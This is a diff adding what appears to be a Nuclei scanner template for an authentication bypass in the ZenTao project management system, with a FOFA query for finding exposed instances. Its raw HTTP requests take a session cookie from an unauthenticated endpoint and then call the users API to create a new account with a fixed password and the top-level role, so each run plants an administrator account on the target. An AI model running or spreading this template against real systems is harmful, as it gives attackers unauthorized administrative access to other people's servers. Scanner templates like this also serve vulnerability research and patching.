@@ -1,0 +1,53 @@
+id: zentao_zentaosid_unauthorized
+
+info:
+  name: zentao_zentaosid_unauthorized
+  author: AQ
+  severity: high
+  description: zentao_zentaosid_unauthorized
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: title="Login - ZenTao", app="易软天创-禅道系统"
+  tags: unauthorized,zentao,hw
+
+variables:
+  account: '{{rand_base(6)}}'
+  password: 'Admin123@'
+
+http:
+  - raw:
+      - |
+        GET /api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=upkbbehwgfscwizoglpw&branch=zqbcsfncxlpopmrvchsu HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /zentao/api.php/v1/users HTTP/1.1
+        Cookie: {{cookie1}}
+        Host: {{Hostname}}
+
+        {"account": "{{account}}", "password": "{{password}}", "realname": "{{account}}", "role": "top", "group": "1"}
+      - |
+        POST /api.php/v1/users HTTP/1.1
+        Cookie: {{cookie1}}
+        Host: {{Hostname}}
+
+        {"account": "{{account}}", "password": "{{password}}", "realname": "{{account}}", "role": "top", "group": "1"}
+
+    extractors:
+      - type: kval
+        name: cookie1
+        part: header_1
+        internal: true
+        kval:
+          - Set_Cookie
+      - type: json
+        part: body_2
+        json:
+          - .account
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\\u300e\\u7528\\u6237\\u540d\\u300f\\u5df2\\u7ecf\\u6709\\u300e"
+# digest: 4a0a00473045022100aa690090f5134196337280620f55dabb356f8e63df6e622aab940f5fb0bcb0a10220303ed3a2ffc58eb6b6da31577912e55daf41763b1e96400ed00e61de69b46c63:6b2dd5af372f02ed15a56faf8ad98cf9
